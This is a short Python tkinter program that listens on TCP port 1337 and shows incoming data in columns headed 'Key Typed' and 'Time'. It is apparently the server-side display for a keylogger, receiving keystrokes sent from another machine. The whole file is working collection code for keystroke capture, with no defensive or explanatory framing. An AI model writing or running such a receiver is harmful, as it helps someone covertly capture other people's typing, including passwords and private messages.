import tkinter as tk
from tkinter import ttk
import socket
import threading
import time

def get_ipv4_address():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ipv4_address = s.getsockname()[0]
        s.close()
        return ipv4_address
    except Exception as e:
        return str(e)

ipv4_address = get_ipv4_address()

HOST = f"{ipv4_address}"
PORT = 1337

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen(1)
    conn, addr = server_socket.accept()

    receive_thread = threading.Thread(target=receive_data, args=(conn,))
    receive_thread.start()

def receive_data(conn):
    while True:
        data = conn.recv(1024)
        if not data:
            break
        data_str = data.decode("utf-8")
        update_display(data_str)

def update_display(data_str):
    text_to_display = f"{data_str}"
    received_label = ttk.Label(inner_frame, text=text_to_display, anchor="w", justify="left")
    received_label.pack(fill="x", pady=5)
    canvas.configure(scrollregion=canvas.bbox("all"))


root = tk.Tk()
root.geometry("600x300")
root.title("Socket Server Data Display")

headings_frame = ttk.Frame(root)
headings_frame.pack(fill="x", pady=10)

key_label = ttk.Label(headings_frame, text="Key Typed", font=("Helvetica", 16, "bold"))
key_label.grid(row=0, column=0, padx=10)

time_label = ttk.Label(headings_frame, text="Time", font=("Helvetica", 16, "bold"))
time_label.grid(row=0, column=1, padx=10)

port_label = ttk.Label(headings_frame, text=f"listnening in {ipv4_address} port: 1337 ", font=("Helvetica", 16, "bold"))
port_label.grid(row=0, column=3, padx=10)

canvas = tk.Canvas(root)
scrollbar = ttk.Scrollbar(root, orient="vertical", command=canvas.yview)
canvas.configure(yscrollcommand=scrollbar.set)

scrollbar.pack(side="right", fill="y")
canvas.pack(side="left", fill="both", expand=True)

inner_frame = ttk.Frame(canvas)
canvas.create_window((0, 0), window=inner_frame, anchor="nw")

server_thread = threading.Thread(target=start_server)
server_thread.start()

root.mainloop()
